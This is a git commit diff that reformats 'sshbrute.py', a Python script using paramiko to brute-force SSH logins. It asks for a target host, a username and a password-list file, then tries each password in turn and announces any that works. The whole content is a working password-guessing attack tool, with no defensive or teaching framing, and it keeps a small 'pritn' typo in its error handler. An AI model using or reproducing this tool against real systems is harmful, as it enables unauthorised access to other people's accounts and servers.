acee75b99438c930edaada1e72816d0e519a830a
xenacode-art <obinnakaja1@gmail.com>
2022-01-11 16:58:55 -0500

    Debugging in progress for sshthreading codes

--- SSHBruteforce/sshbrute.py
+++ SSHBruteforce/sshbrute.py
@@ -1,22 +1,22 @@
-import paramiko , sys , os , socket , termcolor
+import paramiko, sys, os, socket, termcolor
 
 
-def ssh_connect(password,code= 0 ):
+def ssh_connect(password, code=0):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        ssh.connect(host, port=22, username=username, password=password)
 
-  ssh = paramiko.SSHClient()
-  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-  try:
-    ssh.connect(host, port = 22, username = username, password = password)
-     
-  
-  except paramiko.AuthenticationException:
-    code = 1
-   
-  except socket.error as e:
-    code = 2
-  
-  ssh.close()  
-  return code  
+
+    except paramiko.AuthenticationException:
+        code = 1
+
+    except socket.error as e:
+        code = 2
+
+    ssh.close()
+    return code
+
 
 host = input('[+] Target Address: ')
 username = input('[+] SSH Username: ')
@@ -24,25 +24,24 @@ input_file = input('[+] Password File: ')
 print('\n')
 
 if os.path.exists(input_file) == False:
-  print("[!!] File/Path Doesn't Exist")
-  sys.exit(1)
-  
+    print("[!!] File/Path Doesn't Exist")
+    sys.exit(1)
+
 with open(input_file, 'r') as file:
-  for line in file.readlines():
-     password = line.strip()
-     try:
-       response = ssh_connect(password)
-       if response == 0:
-         print(termcolor.colored(('[+] Found Password: ' + password + ' , For Account: ' + username), 'green' ))
-         break  
-         
-       elif response == 1:
-         print('[-] Incorrect Login: ' + password) 
-           
-       elif response == 2: 
-         print('[!!] Cant Connect') 
-         sys.exit(1)
-     except Exception as e:
-       pritn(e)
-     pass
-         
+    for line in file.readlines():
+        password = line.strip()
+        try:
+            response = ssh_connect(password)
+            if response == 0:
+                print(termcolor.colored(('[+] Found Password: ' + password + ' , For Account: ' + username), 'green'))
+                break
+
+            elif response == 1:
+                print('[-] Incorrect Login: ' + password)
+
+            elif response == 2:
+                print('[!!] Cant Connect')
+                sys.exit(1)
+        except Exception as e:
+            pritn(e)
+        pass
